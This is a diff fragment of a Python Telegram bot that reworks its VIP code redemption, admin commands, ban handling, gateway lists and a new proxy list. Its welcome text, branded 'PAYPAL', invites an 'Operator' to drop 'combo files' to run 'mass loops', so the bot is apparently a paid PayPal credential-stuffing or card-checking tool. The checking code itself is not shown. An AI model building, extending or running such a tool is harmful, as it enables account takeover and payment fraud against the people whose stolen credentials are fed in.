+    if await check_banned_guard(update): return
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     if len(context.args) == 0:
-        return await update.message.reply_text("Usage:\n/code YOURCODEHERE")
+        return await update.message.reply_text("Usage:\n/code SEED-KEY")
     code = context.args[0].upper()
     if code not in CODES:
-        return await update.message.reply_text("❌ Invalid code")
+        return await update.message.reply_text("❌ Token signature invalid.")
     code_data = CODES[code]
     if code_data["used"] >= code_data["max_users"]:
-        return await update.message.reply_text("❌ Code usage limit reached")
+        return await update.message.reply_text("❌ Registration failure: Max allocation cap hit.")
     VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
     code_data["used"] += 1
-    await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")
-
-# ------------------- /wafa -------------------
+    await update.message.reply_text(f"🎉 Subscriptions Configured! VIP level open for {code_data['duration']} days.")
 
 async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
     user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can create codes")
+    if user_id not in ADMINS: return
     if len(context.args) < 2:
         return await update.message.reply_text("Usage:\n/wafa DAYS MAX_USERS")
     try:
-        duration = int(context.args[0])
-        max_users = int(context.args[1])
-    except:
-        return await update.message.reply_text("❌ Invalid numbers")
+        duration, max_users = int(context.args[0]), int(context.args[1])
+    except: return
     code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
     CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
-    await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")
-
-# ------------------- /show_users -------------------
+    await update.message.reply_text(f"🔑 𝐂b𝐝e 𝐆e𝐧e𝐫𝐚𝐭e𝐝:\n`{code}`", parse_mode="Markdown")
 
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin")
-    msg = "📊 All Users:\n\n"
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS: return
+    msg = "📊 𝐃𝐚𝐭𝐚𝐛𝐚𝐬e 𝐔𝐬e𝐫𝐬 𝐌𝐚𝐭𝐫𝐢𝐱:\n\n"
     for uid in ALL_USERS:
         status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
-        expire = f" expires in {int((VIP_USERS[uid] - time.time()) / 3600)}h" if uid in VIP_USERS else ""
-        msg += f"{uid} - {status}{expire}\n"
-    await update.message.reply_text(msg if msg else "No users yet")
-
-# ------------------- Ban/Unban -------------------
+        msg += f"• `{uid}` - *{status}*\n"
+    await update.message.reply_text(msg, parse_mode="Markdown")
 
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can ban users")
-    if len(context.args) == 0:
-        return await update.message.reply_text("Usage:\n/ban_user USER_ID")
+    if update.effective_user.id not in ADMINS: return
+    if not context.args: return
     uid = int(context.args[0])
     BANNED_USERS[uid] = True
     VIP_USERS.pop(uid, None)
-    await update.message.reply_text(f"User {uid} banned ✅")
+    await update.message.reply_text("User identifier moved to permanent ban pool. ✅")
 
 async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can unban users")
-    if len(context.args) == 0:
-        return await update.message.reply_text("Usage:\n/unban_user USER_ID")
+    if update.effective_user.id not in ADMINS: return
+    if not context.args: return
     uid = int(context.args[0])
     BANNED_USERS.pop(uid, None)
-    await update.message.reply_text(f"User {uid} unbanned ✅")
-
-# ------------------- New Admin Commands -------------------
+    await update.message.reply_text("Banned parameter dropped. User access normal. ✅")
 
 async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can add gateways")
-    if not context.args:
-        return await update.message.reply_text("Usage:\n/add URL")
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS: return
+    if not context.args: return
     url = context.args[0]
-    if not url.startswith("http"): url = "https://" + url
     if url not in GATEWAYS:
         GATEWAYS.append(url)
-        await update.message.reply_text(f"✅ Gateway added: {url}")
-    else:
-        await update.message.reply_text("❌ Gateway already exists")
+        await update.message.reply_text(f"✅ Active endpoint routing successfully appended.")
 
 async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can remove gateways")
-    if not GATEWAYS:
-        return await update.message.reply_text("❌ No gateways to remove")
-    gw = GATEWAYS.pop()
-    await update.message.reply_text(f"✅ Gateway removed: {gw}")
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS: return
+    if GATEWAYS:
+        gw = GATEWAYS.pop()
+        await update.message.reply_text("🗑 Matrix modification complete: Endpoint gateway popped.")
 
 async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can add VIP")
-    if len(context.args) < 2:
-        return await update.message.reply_text("Usage:\n/prm USER_ID DAYS")
+    if update.effective_user.id not in ADMINS: return
     try:
         target_id = int(context.args[0])
         days = int(context.args[1])
-        expiration = int(time.time()) + (days * 86400)
-        VIP_USERS[target_id] = expiration
-        await update.message.reply_text(f"✅ User {target_id} added to VIP for {days} days")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid ID or Days")
+        VIP_USERS[target_id] = int(time.time()) + (days * 86400)
+        await update.message.reply_text("VIP data structural flags applied. ✅")
+    except: pass
 
 async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMINS:
-        return await update.message.reply_text("❌ Only admin can remove VIP")
-    if not context.args:
-        return await update.message.reply_text("Usage:\n/rmprm USER_ID")
+    if update.effective_user.id not in ADMINS: return
     try:
         target_id = int(context.args[0])
-        if target_id in VIP_USERS:
-            del VIP_USERS[target_id]
-            await update.message.reply_text(f"✅ User {target_id} removed from VIP")
-        else:
-            await update.message.reply_text("❌ User not in VIP list")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid ID")
+        VIP_USERS.pop(target_id, None)
+        await update.message.reply_text("Target VIP authorization dropped completely. ✅")
+    except: pass
 
-# ------------------- /start -------------------
+# ------------------- Initialization -------------------
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
-    await update.message.reply_text("Bot Ready 💬")
+    
+    welcome_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+   🦅   𝐏𝐀𝐘𝐏𝐀𝐋   ⚡
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+  Welcome Operator! System is fully primed.
 
-# ------------------- Run -------------------
+  • Type /cmds to load global command cluster.
+  • Drop combo files directly to activate mass loops.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    await update.message.reply_text(welcome_text, parse_mode="Markdown")
+
+# ------------------- Core App Runner -------------------
 
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("cmds", cmds))
     app.add_handler(CommandHandler("pp", pp))
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("code", code_command))
@@ -716,8 +498,10 @@ def main():
     app.add_handler(CommandHandler("ban_user", ban_user))
     app.add_handler(CommandHandler("unban_user", unban_user))
     app.add_handler(CommandHandler("try", try_reply))
+    app.add_handler(CommandHandler("SENT", sent_broadcast))
     
-    # New Admin Handlers
+    app.add_handler(CommandHandler("proxy", add_proxy))
+    app.add_handler(CommandHandler("rmproxy", remove_proxy))
     app.add_handler(CommandHandler("add", add_gateway))
     app.add_handler(CommandHandler("rmadd", remove_gateway))
     app.add_handler(CommandHandler("prm", add_prm))
